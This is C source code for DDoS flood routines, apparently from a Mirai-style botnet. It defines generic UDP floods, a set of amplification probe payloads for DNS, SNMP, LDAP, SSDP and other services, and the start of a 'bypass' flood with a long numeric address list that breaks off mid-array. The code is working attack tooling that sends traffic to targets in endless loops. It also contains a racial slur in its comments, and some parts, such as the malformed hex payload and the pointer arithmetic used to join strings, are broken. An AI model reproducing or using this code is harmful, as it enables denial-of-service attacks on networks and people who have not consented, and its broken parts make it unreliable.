#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

static unsigned long int Q[4096], c = 362436;

char *hexPayload = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A";

char random_hex() {
    char hexs[] = {'\x0', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x20', '\x21', '\x22', '\x23', '\x24', '\x25', '\x26', '\x27', '\x28', '\x29', '\x2a', '\x2b', '\x2c', '\x2d', '\x2e', '\x2f', '\x30', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', '\x38', '\x39', '\x3a', '\x3b', '\x3c', '\x3d', '\x3e', '\x3f', '\x40', '\x41', '\x42', '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', '\x5b', '\x5c', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', '\x7b', '\x7c', '\x7d', '\x7e', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff'};

    int length = sizeof(hexs) / sizeof(hexs[0]);

    return rand() % (length + 1);
}

static ipv4_t get_dns_resolver(void);

void attack_method_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            //Nigga
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            //Nigga
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_method_nudp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    char* strings[] = {
            "\x0D\x0A\x0D\x0A",
            random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
            random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92",
            "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
            random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + random_hex() + "",
            "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00",
            "\x00\x01\x00\x02\x00\x01\x00",
            "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00",
            "\x02\x01\x00\x006 \x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07 default\x00\x00\x00\x00",
            "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01",
            "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10",
            "\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5",
            "SNQUERY: 127.0.0.1:AAAAAA:xsvr",
            "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0",
            "\x02",
            "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a",
            "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01",
            "xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6",
    };
    
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            send(fds[i], strings[i], strlen(strings[i]) + 1, MSG_NOSIGNAL);
        }
    }
}

void attack_method_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for(i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        char *LAMP[] = {"892157654","3527320063","4137670292","3986742279","2885638308","1842227381","278845653","3318699541","396658918","1742339183","3374115175","3926855775","483368430","4172902516","1064846844","24836492","1061536886","3401183756","1027562418","1164169877","3672128073","60018794","2920623183","397045969","4281691505","2613053816","1507989717","2744972081","4113219853","3879099499","1292551449","2902441078","1548529897","2743021466","1059739767","2844114253","1668641624","2603647902","2335893438","1007201180","3758295641","205358338","3731742832","2870023550","3608350590","1283650536","1081765182","1859467140","3628170965","4288862892","1478959022","63047027","3915110604","303288029","1562163652","254689478","4050501157","2765314765","3318400189","249516069","4015752552","3841116457","3235223745","1159836478","1566538780","618485823","959033246","2046809084","1509181902","3635684308","52264967","1503107019","1828452830","3087092150","3397411608","72350479","3959001559","380743397","1161097069","3848938325","2259652223","425985793","2148232591","232345982","2094104743","1279813495","3467436074","2167585006","3909953823","1793764147","78221274","1342457276","3347985459","693027387","1939558491","1624874848","4202449490","250485710","216007867","704246775","138452680","3874857465","3747374233","3651934659","2646705635","799173165","1518643781","3864429849","1269626702","304052146","1830838221","1335453440","1875900137","2092535390","843834922","3096553478","2982273988","1919278359","1232147607","1399877997","1242988719","833131002","2187269117","2123987459","2916568832","212789680","3298314899","2258308035","3216235962","985884116","3550495733","3453523983","1920807581","2547899963","2606965070","2527742329","200651591","3803823530","1040481139","2993300775","1157130995","3544592840","3633286293","763273038","2645221172","3217337895","1474344842","1126723060","592068258","595843766","737035329","3465903061","2172266950","2154233717","3249714730","2830175374","1055437325","1640021616","1320878734","1378117266","1033772912","2096897933","2536483683","1485308020","905576386","1908762282","341075862","440065530","1070257011","620749128","3427330860","1164874275","1329919344","1472378834","1030970001","3182146059","1240604097","2292349534","2081092020","3106387279","2877349612","3037237324","901843644","1047863467","912922960","304062373","368710070","283929910","230977040","2676706287","3799683882","570720801","3064863655","2336539343","473481011","2737867429","4028549408","2208321038","2017980707","628607679","300695792","2665264569","2479761892","1672958025","459817454","1110934775","3667805579","4196487871","3638008887","1144274331","3194125838","2690104251","1873253280","4232792456","3527920590","392979830","3941853073","1035674189","3944455620","2265315429","4261288621","459390282","3087201544","84799128","615763287","1950745928","2005738185","3464757246","332194843","652135583","3162058205","2931651632","4195298048","598227959","651014809","1450237735","3433548020","2381775690","1799146448","3251103030","760597879","3426673113","1938686062","4097334796","3901813075","1411396519","3467060584","2997059516","2309728683","1644843682","417235299","4214286409","2207800106","513834298","3492715532","2813558444","1564901632","2727297834","768814165","2859832247","2185065738","2724423481","1027175744","1095727216","1557074963","2748222644","80737742","3000305182","4022352958","817753960","1171692661","1593750484","2037040444","1205022188","3788366130","2757201292","4044495716","3196228300","1119008059","2363875437","391659106","2830180811","3410285718","2008672316","2875979207","2297108058","2084716303","3099148892","1104758977","102245576","36510333","3405095697","597254727","1920685197","2941695501","3028095831","2201464000","3231370960","4155486725","389957197","333870144","2836126679","2126101399","349700157","346585659","3697547494","821670456","1568199603","2841036606","3095064971","1858792848","2944706069","1132710312","1241659774","450677728","779398931","54633027","9942091","3632360128","3967167713","1822726482","368325503","1310719427","3082232369","3570651508","3300293848","1875292024","817886403","3045367867","4077416984","3342953308","34137808","1468941472","1746304275","2758689516","2841869194","4254595689","2778604023","2867862701","3569584681","3149929811","3072242975","3740340501","3476138","688630943","935508326","4080851920","2656321869","3878688814","3767063148","3806376660","3795926814","703952894","1483785533","2787871373","4225782463","3415735556","2607633391","3192868956","1898650532","2867660001","1532820133","4099908322","106048452","2426947063","3257997265","2671347321","1753746112","4094295869","2604128688","4282270949","4091326126","3340377082","3130620100","194242120","3041234396","3886976686","2540384754","1538676922","869138703","3443149653","4240933954","2465825237","3253932457","1659453874","1294317702","378934154","1513380441","199431287","1953130892","1253540026","3099765428","3253674244","327772485","2236560434","2410366931","2562959043","2541246516","3350909455","1981564109","2240925798","3618433673","3384343442","1336411240","2163600219","924194031","131006458","3472353287","1964505684","3300849405","1920140961","4106984137","3871428246","3115126578","4143145093","2546966099","1111869465","159677014","1332774220","1231467232","3821195029","4196362838","1058989214","2084049401","3320275769","3853874258","1092163167","2250139405","445009232","3553681806","3304284188","2552943228","3023859575","2368871336","2638511959","28262813","763133760","416755909","2095991561","3426246901","3027138275","3969074595","1813256182","308570463","3784950881","1846972479","1933667749","1856777509","3600603079","3197221197","494251576","197695799","613727633","1153902270","2295282312","1995035462","3978433071","955638142","3136065243","767483931","391437766","715736195","4044129952","997616126","1005951416","1388386238","1990773871","2889267352","230014794","419914761","1483410512","1245068262","1940485796","62853662","419598495","1774033369","2719141956","1220439791","606837057","2264428181","261639022","142667962","3784724142","2420783902","2380855684","1208237926","2980445918","2123416751","333587401","3603677903","1202766571","929325358","3211375957","1123543299","1559411287","2893654156","4165644395","953560081","1274429421","1585315296","418847556","581410402","2353196063","432938619","447829562","4248454586","1484457283","218769118","1012307985","4271090851","1784553529","2712061143","2254945521","1391423054","1074226045","3653352751","1546692244","87246678","822296782","2048451742","3805230103","985745655","562597027","1994793382","3799647454","577889013","2902833511","677244848","3024706151","578870048","2478245287","3968840702","1230166330","3363322538","1545369630","3269445690","4200647331","3194880091","2852461205","1302412301","4192212087","4076926567","2875112768","3154014657","3914362367","429975264","1878632526","3168519349","1181707973","2130758681","2992243415","3353599283","452644448","3097967903","315283582","2324924821","1828608953","4241125686","603186810","2061388072","2590928818","854769928","2219972260","2430116212","3889841961","4187735043","3864366609","735992010","74965378","3262602996","2338511020","1926605391","2738487788","4151943941","4177688789","1053934284","1995576199","158779414","1649054203","910786166","3368905918","1505934347","3903994438","2985352819","878344820","2750477967","1875246718","1705449818","3674084841","2990410410","118083227","4285117552","3098655498","3839729714","3842211442","1212731556","538822854","1616503213","4137896560","820059830","4187818638","4236356093","1673942395","3943248642","239028292","3637858464","1202900328","1097680230","1195218168","1297436170","626867003","1206727456","3654205838","3908943256","1662078765","1872446392","847067427","3220331662","687591196","2985977343","2383826644","409335974","2750957058","831008670","1929797748","4055353940","4056549635","1511329791","1839010829","1665927244","1623335299","2581535737","2751651183","2089399246","71769842","691172624","2694551451","2562145611","3719270270","3165575208","3516470991","3106496348","4082952243","3701994062","3833472123","3685778438","3854655887","726456308","2568363934","3416861250","3160965688","3650466337","3570979246","1744805706","2132297858","1272557658","3188913289","3517519566","894372467","489807564","3285397219","2455632785","3863477624","418370817","2185313091","4136938982","1551823881","1061950737","1545111494","1858206064","1924347673","397022744","1300494027","1731247795","1202844413","3287818592","4068256319","2011508186","437062781","1046577065","3735830996","2234646561","3325892330","2827008128","743088978","1566306412","2153735720","2241883944","2624216418","1116700723","3492101898","4256213797","684263128","2164312935","2794349340","3162172490","1224623214","1483627254","4259642563","1633402417","1403001945","341098849","753065041","1891021944","623264593","2003379507","3709481748","2287646226","390617538","528982388","2540275880","3412944998","3266832915","678670646","2282421510","4270365653","2942721495","2494619543","1863838013","2659241709","388796269","225861937","4224812907","2059122831","3669184015","852934269","1232717847","1343181767","1356077576","897439700","4102974222","3077130592","3194862515","3710421174","4185870784","1600138385","1774115550","493567011","3318435961","3970316685","2699603124","822586054","641867050","3829978181","4161505917","2620862895","2684643934","3571180651","1179439722","1920712868","3992925870","4110098466","1190810286","3906075036","1959958525","3767151946","1759580578","3819945511","3253891461","3348902898","3015585495","4021923439","2429560975","3505202092","4080832094","3135633273","140798516","3627314122","2951454158","448720207","3567826329","3859791863","1037781472","1624936343","4011228020","656750022","1720023274","1852046775","2383539881","537429119","3913763610","1294205916","1952250823","4210593561","741380955","2742257187","3881553468","3413594814","70668136","1619817197","2761144373","934080615","2937359618","1458770871","186449721","108093352","3166350238","335598741","4206896936","407979073","3180192890","1670910129","2255251050","4194782749","3821668223","2312336397","1045020137","2159349292","1931042533","4026416092","1441269858","500195870","3762382314","1958340683","2501277579","4239072784","3248928120","4153443534","803395646","3612392081","607532935","4191724803","1629625948","2020806733","1465331624","3541557785","946067791","3228400335","610998408","186874246","3947686826","2552263962","4225878303","4059402030","412400425","2622132873","1699350125","2936063199","3160653749","2189651464","1568786095","1059671465","775827634","763470242","1788000961","2385430310","339463042","509260909","2186201729","806111732","503251813","234965614","1053002652","1781877821","3165467927","282190549","2775884972","4199321089","1202079582","257007520","3982701215","4103541715","3352671568","639018282","999353315","3873979340","3699979506","3084404229","4171475148","2243238193","3563395898","2833462540","1436779053","470669711","593710224","662154362","4078189250","1626167167","2730175947","2399147501","2796293763","445525890","2182038811","1153574273","3438855036","2607553522","1213651386","3472819265","1906472875","2978698576","1638303351","3215223166","906048282","2034186538","30702841","3245746326","2302068735","716638664","408641289","3687246909","748421657","4032960821","1882659392","227071445","728100630","3244754199","977917224","462108026","3946098629","4196754619","846864200","3354480643","2617451949","4194924696","3692308461","1069795992","2717755772","3204078269","1709318236","2615943813","3049181535","3991065083","789302341","428421437","489390648","1416281833","4207649187","2156099532","1394437616","201554091","3672098709","4067730799","4166090677","410178415","1070597129","1318549978","2902134198","1138376086","3307919837","3247243986","2446983999","4235298564","4276252888","1279533701","2332592623","4068996439","1847858541","2927392227","4074869892","3875614394","3725220819","398482198","1633816953","3818329980","3199864813","3993049004","2483053991","372643826","1434095030","698437876","2276940538","3568469511","2660045227","1230567785","3490750052","1300221391","222986878","996018008","847792852","1356314561","1937152810","2761915125","361557749","3901026952","733434963","2755909751","3063729278","56255027","2398375668","687834044","434457414","1094923608","1506956052","939541534","2709924250","3847393537","2564579774","2373824367","1927581276","3225600790","409987280","370733260","883073477","2749560558","2709752443","1660476902","4007525130","2807708011","1317325744","1993446282","3860930189","639947980","2250929806","3995360608","35695352","2743915150","1700181371","1560805744","2978119447","2124555584","1278797942","1874791496","480261473","2488875049","385667822","2001962090","2504616791","1467538062","2703405756","1126379220","2826370004","3985476239","3375394729","452758492","3678854398","551489577","808890649","636312872","402983310","2898962086","412440719","2343551806","2140133426","4157883304","3792212383","1444896861","1811001619","2575091438","982386461","1264924530","290354637","3133083369","3050730637","1775168095","435712231","655237168","1280860497","3729311278","3286938317","3235028882","1141817034","3320544163","671980031","1082997976","1395704593","3842348150","811611036","3396867980","2824641513","1964121718","1862166866","3482575523","494871923","1815863709","1310663899","1894247190","1578577060","1740293325","2393795025","3978803140","1816727221","2480927990","1940793850","4257441315","40522047","2122146677","922645176","3685443574","2240893772","3509245941","517709760","4133616423","2014434570","3522134192","2916075743","353908913","1364806819","1096458020","1692573308","1825424418","1318047964","2225529556","4048555214","1812607591","1086510002","3817643314","685259151","3974610133","2030319980","3641583372","1209296544","3755634759","2827871574","722820406","856948961","1502708728","2402587023","922029996","3587560353","2876069462","2273394301","4176703167","4208854908","2704181493","1106651791","3462668719","1724278665","61964277","3632623436","1536635751","2806748848","1712625728","3677383821","787238098","1554378734","1707783925","451673427","1372386058","596203876","1196823541","311271270","2818973275","3739880744","4077249093","2659183179","2705428792","3712511290","703890107","3722543025","4107450782","1343070","2450278612","2382438095","2426816722","883995420","2140473818","1323589275","3622407856","1171132526","1965275384","2367690932","3939292578","1622767497","326286362","2561891930","2082420083","2324005264","2653227544","1408785943","1275488673","2183789995","2997504442","3661036888","3596284214","1299322196","3779077273","649395070","3946165282","2417267547","468128807","569822875","3949416932","2340738165","372242287","1514011364","3245574408","2414843517","2686379954","2926786092","4210264117","533802210","2975561490","943564829","2539419098","2346347299","2096861508","3291665802","1852671963","2490124024","167845655","1121163640","3724695405","2988835304","1236961649","40738051","1990580201","1870045989","719241197","3805338062","2897463573","1038129273","2006994874","2915989699","3290956364","2197576703","669152859","3808443426","2155202660","2970734182","2957525690","3847325854","1476448884","2417248537","3674428536","1917551523","2603234106","2189887590","3146448508","3616604167","3953403930","510490834","1172643236","645329418","480591106","2585405106","3600260260","1948746412","2770204173","3522067501","866417452","3927840451","983243497","4227713054","697547043","1678817065","3065414534","2069898269","579302778","1951627667","2875899193","1508299309","3457897192","3005906208","2839764295","2946121283","2023438334","766640826","1556891461","4054686719","3231992988","2360052687","747430920","1775461975","2599523204","1314053959","1167064362","273687510","3892156189","2795633867","628113677","1044054559","2697553721","1250427316","3285098482","122885387","2035155600","3869935861","1665704697","423908455","160264266","3900215738","2727598961","1088793107","4271571244","3019163221","3837367583","380985693","3504662964","2225127472","3663353878","451665070","912929594","3997527465","2925813072","412973586","408019735","1266267901","1058209613","1148343055","2076087562","1949041296","672497030","3096767550","4143709537","1847974667","3258440159","2919282908","3514650569","2862970224","2420579959","227688257","40623115","3741505764","2474925842","2210996690","2165549616","1619126542","2457808568","1660681298","683704759","1158356430","2637214783","1047432163","88473794","2694657945","2036184109","3610540748","3514578291","3040714615","541256317","2473857884","4232931368","443755063","2613666301","3929790460","2510585322","2781652694","4223347424","2563810997","222429622","1082821454","2653564936","1547111443","487035851","3470175301","635274003","4023982854","3698254835","4